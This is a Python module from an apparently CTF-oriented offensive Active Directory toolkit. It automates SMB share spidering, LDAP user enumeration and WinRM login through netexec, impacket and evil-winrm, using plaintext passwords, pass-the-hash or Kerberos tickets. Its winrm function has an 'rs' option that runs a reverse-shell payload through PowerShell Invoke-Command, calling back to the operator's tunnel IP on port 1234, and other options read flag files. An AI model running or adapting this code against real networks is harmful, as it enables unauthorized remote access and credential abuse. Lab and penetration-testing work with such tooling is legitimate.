import os 
import config, payload

def smb_view(box, path):
    if config.HELP:    
        print("""
Action:\t[Protocol] smb
Tool:\tnetexec, impacket
Option:\t-u, --username
\t-p --password; -H, --hash; -k
Desc:\t1. Lists all existing SMB shares with permissions
\t2. Lists all readable file names and stores them in a file under enum/
\t3. Displays a command that can be used to log in via SMB
Info:\t/
        """)
        return 0
    config.required_creds(box)
    os.chdir(path.ws_enum)
    print('\033[92m[*]\033[0m List SMB shares & files')
    if isinstance(box.krb, str):
        cmd = f"{box.krb_ccache} netexec smb {box.fqdn} --use-kcache --shares"
        cmd2 = f"{box.krb_ccache} netexec smb {box.fqdn} --use-kcache -M spider_plus"
        cmd3 = f"{box.krb_ccache} impacket-smbclient -k -no-pass {box.fqdn}"
    elif box.krb:
        cmd = f"netexec smb {box.fqdn} -u {box.username} -p {box.password} -k --shares"
        cmd2 = f"netexec smb {box.fqdn} -u {box.username} -p {box.password} -k -M spider_plus"
        cmd3 = f"impacket-smbclient -k {box.domain}/{box.username}:{box.password}@{box.fqdn}"
    elif box.nt_hash:
        cmd = f"netexec smb {box.fqdn} -u {box.username} -H {box.nt_hash} --shares"
        cmd2 = f"netexec smb {box.fqdn} -u {box.username} -H {box.nt_hash} -M spider_plus"
        cmd3 = f"impacket-smbclient {box.domain}/{box.username}@{box.fqdn} -hashes :{box.nt_hash}"
    else:
        cmd = f"netexec smb {box.fqdn} -u {box.username} -p {box.password} --shares"
        cmd2 = f"netexec smb {box.fqdn} -u {box.username} -p {box.password} -M spider_plus"
        cmd3 = f"impacket-smbclient {box.domain}/{box.username}:{box.password}@{box.fqdn}"
    config.log_cmd(cmd)
    print(f'\033[96m[$]\033[0m {cmd}')
    filter = " | sed 's/^\([^[:space:]]\+[[:space:]]\+\)\{4\}//'"
    os.system(cmd+filter+f' | tee {box.username}_smb-shares.txt')
    print(f'\n\033[96m[$]\033[0m {cmd2}')
    out = os.popen(cmd2).read()
    print('\n'.join(out.splitlines()[-10:]))
    os.system(f'cp /home/kali/.nxc/modules/nxc_spider_plus/{box.fqdn}.json {box.username}_shares-files.json')
    os.system(f'cp /home/kali/.nxc/modules/nxc_spider_plus/{box.ip}.json {box.username}_shares-files.json')
    print(f'[*] Output file in /enum/{box.username}_shares-files.json')
    print(f'\n\033[96m[$]\033[0m {cmd3}')
    print('\033[38;5;28m[+]\033[0m List SMB shares\n')

def winrm(box, path, cmd_):
    if config.HELP:    
        print("""
Action:\t[Protocol] winrm
Tools:\tevil-winrm
Option:\t-u, --username
\t-p --password; -H, --hash; -k
\t-x, --cmd (Optional)
\t-t, --target [username:password] (Optional)
Desc:\tLogs in via WinRM.\n\tOptionally execute a command or as the specified target.
\t ~ user = read user.txt from the current Desktop folder
\t ~ root = read root.txt from the administrator Desktop folder
\t ~ rs   = open a reverse shell for this user or target (port 1234)
Info:\tWhen passing commands with options, the shell closes or hangs.
        """)
        return 0
    config.required_creds(box)
    #os.chdir(path.ws_scr)
    print('\033[92m[*]\033[0m Login to WinRm (run CMD)')
    ps_cmd = ""
    cmds = cmd_.split(",")
    if cmds:
        for cmd in cmds:
            if cmd.replace(".txt","") == "user":
                ps_cmd = r'echo "Get-ChildItem -Path C:\Users -Filter "user.txt" -Recurse -ErrorAction SilentlyContinue | ForEach-Object  { Get-Content \$_.FullName }" | '
            elif cmd.replace(".txt","") == "root":
                ps_cmd = 'echo "type /Users/Administrator/Desktop/root.txt" | '
            elif cmd == "rs":
                # pass via cmd=rs-ps or rs-runas (to do)
                username = box.username
                password = box.password
                if box.target:
                    if ":" not in box.target:
                        print("\033[91m[!]\033[0m Separate username and password with :")
                        exit()
                    username, password = box.target.split(":", 1)
                ip = config.get_tun0_ip()
                port = "1234"
                print(f'[*] Run revshell as {username} : {password}')
                print(f'[*] Start listener on {ip}:{port}')
                ps_cmd = f'''echo "$c=New-Object PSCredential('{box.domain}\\{username}',(ConvertTo-SecureString '{password}' -AsPlainText -Force)); icm {box.hostname} -Cred $c {{ cmd /c {payload.revshell_ps(username, password, ip, port)} }}" | '''.replace('$', '\\$')

            if box.krb or isinstance(box.krb, str):
                cmd = f"{ps_cmd}{box.krb_ccache} evil-winrm -i {box.fqdn} -r {box.domain}"
            elif box.nt_hash:
                cmd = f"{ps_cmd}evil-winrm -i {box.fqdn} -u {box.username} -H {box.nt_hash}"
            else:
                cmd = f"{ps_cmd}evil-winrm -i {box.fqdn} -u {box.username} -p {box.password}"
            config.log_cmd(cmd)
            print(f'\033[96m[$]\033[0m {cmd}')
            os.system(cmd)
            print('\033[38;5;28m[+]\033[0m Login to WinRm')

def ldap(box, path, cmd):
    if config.HELP:    
        print("""
Action:\t[Protocol] ldap
Tool:\tnetexec
Option:\t-u, --username
\t-p, --password; -H, --hash; -k
\t-x, --cmd (Optional)
Desc:\tLogs in via LDAP.\n\tSend a custom query with no filter or opens a menu when no cmd parameter is set.
Info:\tUse sAMAccountName for filter or input.
        """)
        return 0
    config.required_creds(box)
    os.chdir(path.ws_enum)
    print('\033[92m[*]\033[0m Login to LDAP (run Query)')
    if cmd:
        query = f"--query '{cmd}' ''"
    else:
        choice = config.show_menu("LDAP",["All enabled users", "All disabled users", "All attributes from user(s)", "All users with description"])
        if choice == 1:
            cmd = "(&(objectCategory=person)(objectClass=user)(!(useraccountcontrol:1.2.840.113556.1.4.803:=2)))"
            query = f"--query '{cmd}' 'samaccountname'"
            query = query + " | grep sAMAccountName | awk '{print$6}'"
        elif choice == 2:
            cmd = "(&(objectCategory=person)(objectClass=user)(useraccountcontrol:1.2.840.113556.1.4.803:=2))"
            query = f"--query '{cmd}' 'samaccountname'"
            query = query + " | grep sAMAccountName | awk '{print$6}'"
        elif choice == 3:
            choice_ = config.ask_for_action_choice("*,samaccountname")
            if choice_ == "*":
                output_file = "users_attributes.out"
            else:
                output_file = f"{choice_}_attributes.out"
            cmd = f"(&(objectCategory=person)(objectClass=user)(sAMAccountName={choice_}))"
            query = f"--query '{cmd}' ''"
            query = query + " | awk '{$1=$2=$3=$4=\"\"; sub(/^    */, \"\"); print}' > "+output_file
            print(f"[*] Save output in file: {os.getcwd()}/{output_file}")
        elif choice == 4:
            cmd = "(&(objectCategory=person)(objectClass=user)(description=*))"
            query = f"--query '{cmd}' 'description samaccountname'"
            query = query + " | awk '{$1=$2=$3=$4=\"\"; sub(/^    */, \"\"); print}' > users_description.out"
            print(f"[*] Save output in file: {os.getcwd()}/users_description.out")


    if isinstance(box.krb, str):
        cmd = f"{box.krb_ccache} netexec ldap {box.fqdn} --use-kcache {query}"
    elif box.krb:
        cmd = f"netexec ldap {box.fqdn} -u {box.username} -p {box.password} -k {query}"
    elif box.nt_hash:
        cmd = f"netexec ldap {box.fqdn} -u {box.username} -H {box.nt_hash} {query}"
    else:
        cmd = f"netexec ldap {box.fqdn} -u {box.username} -p {box.password} {query}"
    config.log_cmd(cmd)
    print(f'\033[96m[$]\033[0m {cmd}\n')
    os.system(cmd)
    print('\033[38;5;28m[+]\033[0m Login to LDAP')
